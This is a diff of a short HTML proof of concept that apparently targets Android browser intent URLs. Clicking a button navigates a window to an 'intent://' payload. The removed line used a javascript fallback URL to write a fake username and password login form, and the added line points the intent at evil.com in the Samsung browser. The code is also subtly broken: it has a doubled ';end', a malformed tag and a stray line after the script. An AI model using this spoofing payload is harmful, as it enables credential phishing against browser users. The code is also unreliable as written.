@@ -1,10 +1,10 @@
 <!doctype html>
 <meta charset=utf-8>
 <body>
-<button id=btn>Run</button>
+<button id=btn>Runn</button>
 <script>
 const js = 'document.write("h2>Login</h2><form><input type=text placeholder=Username><br><input type=password placeholder=Password><br><button>Login</button></form>")';
-const payload = 'intent://scan#Intent;scheme=z;S.browser_fallback_url=javascript:'
+const payload = 'intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'
               + encodeURIComponent(js) + ';end';
 
 btn.onclick = () => {
@@ -13,3 +13,4 @@ btn.onclick = () => {
   setTimeout(() => { w.location = payload; }, 100);
 };
 </script>
+intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'
